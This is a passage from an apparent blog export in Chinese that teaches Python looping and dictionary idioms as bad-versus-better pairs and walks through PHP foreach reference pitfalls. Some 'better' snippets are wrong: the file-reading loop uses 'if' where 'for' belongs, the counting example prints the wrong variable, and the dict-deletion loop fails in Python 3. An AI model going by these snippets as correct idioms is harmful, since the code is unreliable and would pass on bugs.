<h3 id="建立序列索引"><a href="#建立序列索引" class="headerlink" title="建立序列索引"></a>建立序列索引</h3><ul>
<li><p>python3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(colors)):</span><br><span class="line">    <span class="keyword">print</span> (i, <span class="string">'---&gt;'</span>, colors[i])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"><span class="keyword">for</span> i, color <span class="keyword">in</span> enumerate(colors):</span><br><span class="line">    <span class="keyword">print</span> (i, <span class="string">'---&gt;'</span>, color)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="遍历两个序列"><a href="#遍历两个序列" class="headerlink" title="遍历两个序列"></a>遍历两个序列</h3><ol>
<li><p>python2:(用izip返回迭代)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>]</span><br><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">n = min(len(names), len(colors))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    <span class="keyword">print</span> names[i], <span class="string">'---&gt;'</span>, colors[i]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> name, color <span class="keyword">in</span> zip(names, colors):</span><br><span class="line">    <span class="keyword">print</span> name, <span class="string">'---&gt;'</span>, color</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> name, color <span class="keyword">in</span> izip(names, colors):</span><br><span class="line">    <span class="keyword">print</span> name, <span class="string">'---&gt;'</span>, color</span><br></pre></td></tr></table></figure>
</li>
<li><p>python3:(用zip返回迭代)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>]</span><br><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">n = min(len(names),len(colors))</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> range(n):</span><br><span class="line">    print(names[i],<span class="string">'---&gt;'</span>,colors[i])</span><br><span class="line"><span class="comment">#batter</span></span><br><span class="line"><span class="keyword">for</span> name, color <span class="keyword">in</span> zip(names,colors):</span><br><span class="line">    print(name,<span class="string">'---&gt;'</span>,color)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="遍历排序的序列"><a href="#遍历排序的序列" class="headerlink" title="遍历排序的序列"></a>遍历排序的序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>,<span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Forward sorted order</span></span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> sorted(colors):</span><br><span class="line">    print(color)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Backwards sorted order</span></span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> sorted(colors,reverse=<span class="keyword">True</span>):</span><br><span class="line">    print(color)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="自定义遍历序列"><a href="#自定义遍历序列" class="headerlink" title="自定义遍历序列"></a>自定义遍历序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>, <span class="string">'yellow'</span>]</span><br><span class="line"> </span><br><span class="line">print(sorted(colors,key=len))</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="遍历文件遇到指定字符退出"><a href="#遍历文件遇到指定字符退出" class="headerlink" title="遍历文件遇到指定字符退出"></a>遍历文件遇到指定字符退出</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad</span></span><br><span class="line">blocks = []</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    block = f.read(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> block == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    blocks.append(block)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">blocks = []</span><br><span class="line"><span class="keyword">if</span> block <span class="keyword">in</span> iter(partial(read,<span class="number">32</span>),<span class="string">''</span>):</span><br><span class="line">    blocks.append(block)</span><br><span class="line"><span class="comment">#iter是一个内置函数用来生产迭代器，partial的不断的读入文件中32字节，注意iter引入第二个参数，表示当读入的内容是''的时候，会触发生成器stop</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="函数遍历多出口问题"><a href="#函数遍历多出口问题" class="headerlink" title="函数遍历多出口问题"></a>函数遍历多出口问题</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(seq, target)</span>:</span></span><br><span class="line">    found = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate(seq):</span><br><span class="line">        <span class="keyword">if</span> value == target:</span><br><span class="line">            found = <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better(for else结构)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(seq, target)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate(seq):</span><br><span class="line">        <span class="keyword">if</span> value == target:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">'matthew'</span>: <span class="string">'blue'</span>, <span class="string">'rachel'</span>: <span class="string">'green'</span>, <span class="string">'raymond'</span>: <span class="string">'red'</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    print(k)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d.keys():</span><br><span class="line">    <span class="keyword">if</span> k.startswith(<span class="string">'a'</span>):</span><br><span class="line">        <span class="keyword">del</span> d[k]</span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历键和值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">'matthew'</span>: <span class="string">'blue'</span>, <span class="string">'rachel'</span>: <span class="string">'green'</span>, <span class="string">'raymond'</span>: <span class="string">'red'</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    print(k, <span class="string">'--&gt;'</span>, d[k])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#batter</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> d.items():</span><br><span class="line">    print(k,<span class="string">'---&gt;'</span>,v)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="构造字典"><a href="#构造字典" class="headerlink" title="构造字典"></a>构造字典</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>]</span><br><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>]</span><br><span class="line"> </span><br><span class="line">d = dict(zip(names, colors))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="字典的统计"><a href="#字典的统计" class="headerlink" title="字典的统计"></a>字典的统计</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'red'</span>, <span class="string">'blue'</span>, <span class="string">'green'</span>, <span class="string">'red'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> colors:</span><br><span class="line">    <span class="keyword">if</span> color <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">        d[color] = <span class="number">0</span></span><br><span class="line">    d[color] += <span class="number">1</span></span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#batter</span></span><br><span class="line">s = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> colors:</span><br><span class="line">    s[color] = s.get(color,<span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="对序列的值根据元素长度进行分组"><a href="#对序列的值根据元素长度进行分组" class="headerlink" title="对序列的值根据元素长度进行分组"></a>对序列的值根据元素长度进行分组</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>, <span class="string">'roger'</span>,</span><br><span class="line">         <span class="string">'betty'</span>, <span class="string">'melissa'</span>, <span class="string">'judith'</span>, <span class="string">'charlie'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    key = len(name)</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">        d[key] = []</span><br><span class="line">    d[key].append(name)</span><br><span class="line"></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    key = len(name)</span><br><span class="line">    d.setdefault(key, []).append(name)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">s = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    key = len(name)</span><br><span class="line">    s.setdefault(key, []).append(name)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="字典遍历倒序"><a href="#字典遍历倒序" class="headerlink" title="字典遍历倒序"></a>字典遍历倒序</h3><ul>
<li><p>python3:(使用popitem)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">'matthew'</span>: <span class="string">'blue'</span>, <span class="string">'rachel'</span>: <span class="string">'green'</span>, <span class="string">'raymond'</span>: <span class="string">'red'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> d:</span><br><span class="line">    key, value = d.popitem()</span><br><span class="line">    <span class="keyword">print</span> (key, <span class="string">'--&gt;'</span>, value)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="字典链接"><a href="#字典链接" class="headerlink" title="字典链接"></a>字典链接</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">defaults = &#123;<span class="string">'color'</span>: <span class="string">'red'</span>, <span class="string">'user'</span>: <span class="string">'guest'</span>&#125;</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--user'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--color'</span>)</span><br><span class="line">namespace = parser.parse_args([])</span><br><span class="line">command_line_args = &#123;k:v <span class="keyword">for</span> k, v <span class="keyword">in</span> vars(namespace).items() <span class="keyword">if</span> v&#125;</span><br><span class="line"></span><br><span class="line">d = defaults.copy()</span><br><span class="line">d.update(os.environ)</span><br><span class="line">d.update(command_line_args)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">d = collections.ChainMap(command_line_args, os.environ, defaults)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#关于Python中ChainMap的使用：http://blog.topspeedsnail.com/archives/9726</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="使用关键字提高代码清晰度"><a href="#使用关键字提高代码清晰度" class="headerlink" title="使用关键字提高代码清晰度"></a>使用关键字提高代码清晰度</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad</span></span><br><span class="line">twitter_search(<span class="string">'@obama'</span>, <span class="keyword">False</span>, <span class="number">20</span>, <span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line">twitter_search(<span class="string">'@obama'</span>, retweets=<span class="keyword">False</span>, numtweets=<span class="number">20</span>, popular=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="展开序列"><a href="#展开序列" class="headerlink" title="展开序列"></a>展开序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="string">'Leo'</span>,<span class="string">'Xin'</span>,<span class="string">'30'</span>,<span class="string">'coder'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">fname = p[<span class="number">0</span>]</span><br><span class="line">lname = p[<span class="number">1</span>]</span><br><span class="line">age = p[<span class="number">2</span>]</span><br><span class="line">email = p[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">fname,lname,age,email = p</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="交换变量"><a href="#交换变量" class="headerlink" title="交换变量"></a>交换变量</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        print(x)</span><br><span class="line">        t = y</span><br><span class="line">        y = x + y</span><br><span class="line">        x = t</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span></span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">print</span> (x)</span><br><span class="line">        x, y = y, x + y</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="更新序列"><a href="#更新序列" class="headerlink" title="更新序列"></a>更新序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>, <span class="string">'roger'</span>,</span><br><span class="line">         <span class="string">'betty'</span>, <span class="string">'melissa'</span>, <span class="string">'judith'</span>, <span class="string">'charlie'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">del</span> names[<span class="number">0</span>]</span><br><span class="line">names.pop(<span class="number">0</span>)</span><br><span class="line">names.insert(<span class="number">0</span>, <span class="string">'mark'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line">names = collections.deque([<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>, <span class="string">'roger'</span>,</span><br><span class="line">               <span class="string">'betty'</span>, <span class="string">'melissa'</span>, <span class="string">'judith'</span>, <span class="string">'charlie'</span>])</span><br><span class="line"><span class="keyword">del</span> names[<span class="number">0</span>]</span><br><span class="line">names.popleft()</span><br><span class="line">names.appendleft(<span class="string">'mark'</span>)</span><br><span class="line">print(names)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用collections模块里面的双向队列，会更简洁</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="使用线程锁"><a href="#使用线程锁" class="headerlink" title="使用线程锁"></a>使用线程锁</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">lock.acquire()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 1'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 2'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line"><span class="keyword">with</span> lock:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 1'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 2'</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="修改for循环语句"><a href="#修改for循环语句" class="headerlink" title="修改for循环语句"></a>修改for循环语句</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = []</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    s = i ** <span class="number">2</span></span><br><span class="line">    result.append(s)</span><br><span class="line"><span class="keyword">print</span> (sum(result))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line"><span class="keyword">print</span> (sum(i**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)))</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>foreach的一些小坑</title>
    <url>/2018/09/29/foreach%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%9D%91/</url>
    <content><![CDATA[<h3 id="PHP-foreach的一些小坑"><a href="#PHP-foreach的一些小坑" class="headerlink" title="PHP-foreach的一些小坑"></a>PHP-foreach的一些小坑</h3><blockquote>
<p>再PHP中，foreach是对数组遍历的一个方法，遍历也只用于数组，在编程的时候有一些小坑，记录如下。</p>
</blockquote>
<h4 id="foreach的两种语法结构"><a href="#foreach的两种语法结构" class="headerlink" title="foreach的两种语法结构"></a>foreach的两种语法结构</h4><ol>
<li><p>只遍历引用值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $value)</span><br><span class="line">    　　statement</span><br><span class="line">    </span><br><span class="line"><span class="comment">//示例：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//显示结果：</span></span><br><span class="line"><span class="number">1234</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历引用键和值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">  　　  statement</span><br><span class="line">  　　  </span><br><span class="line"><span class="comment">//示例：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"[$key] =&gt; $value\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[$key] =&gt; $value"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line">[<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">[<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">[<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">[<span class="number">3</span>] =&gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>] =&gt; <span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="在foreach中是否使用-amp-的区别："><a href="#在foreach中是否使用-amp-的区别：" class="headerlink" title="在foreach中是否使用&amp;的区别："></a>在foreach中是否使用&amp;的区别：</h4><ol>
<li><p>不使用&amp;，foreach的作用域只在当前循环中，不会改变外部数组的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	$value = $value * <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">8</span> </span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">4</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用&amp;会使得作用域扩大到对应的数组，改变数组的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	$value = $value * <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">8</span> </span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">4</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">6</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">8</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="在foreach中是否使用-amp-的坑点："><a href="#在foreach中是否使用-amp-的坑点：" class="headerlink" title="在foreach中是否使用&amp;的坑点："></a>在foreach中是否使用&amp;的坑点：</h4><ol>
<li><p>这里和上面的作用域联系起来，没使用以后不会影响数组本身，所以两次foreach的结果互不影响：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="comment">// $value = $value * 2;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用以后改变了作用域，这里&amp;指向第一次foreach的最后一个地址，在PHP中它不会自动释放该地址：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	<span class="comment">// $value = $value * 2;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">3</span> </span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看它每次具体的变化：(这里可以验证每次改变的是&amp;指向的最后一个地址)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;&#125;</span><br><span class="line">;</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&#123;$key&#125; =&gt; &#123;$value&#125; "</span>;</span><br><span class="line">	print_r($arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">4</span></span><br><span class="line">)</span><br><span class="line"><span class="number">0</span> =&gt; <span class="number">1</span> <span class="keyword">Array</span></span><br><span 